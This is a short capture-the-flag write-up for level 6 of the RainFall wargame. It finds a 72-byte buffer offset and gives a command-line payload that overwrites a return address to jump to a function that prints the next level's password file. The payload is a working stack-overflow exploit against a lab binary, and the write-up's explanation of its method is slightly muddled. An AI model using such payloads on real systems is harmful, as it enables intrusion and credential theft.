# level 6

In this level we have to overwrite the return address of the function `strcpy` in the `main` function with the address of the function `n` to read the password of the next level.

For more explanation about the assembly code of the program, see the [gdb writeup](gdbwriteup.md).

First, we will need to find the buffer size of the strcpy function. We can do this by running the program with gdb and setting a breakpoint at the strcpy function. Then we will run the program until the breakpoint is reached and check the value of the stack pointer.

```sh
level6@RainFall:~$ ./level6 $(python -c "print('a' * 71)")
Nope
level6@RainFall:~$ ./level6 $(python -c "print('a' * 72)")
Segmentation fault (core dumped)
```

We can assume that the buffer size is 72 bytes.

After them, we will enter the address of the function `n` to execute the system function with the string "/bin/cat /home/user/level7/.pass" as argument.

```sh
level6@RainFall:~$ ./level6 $(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
```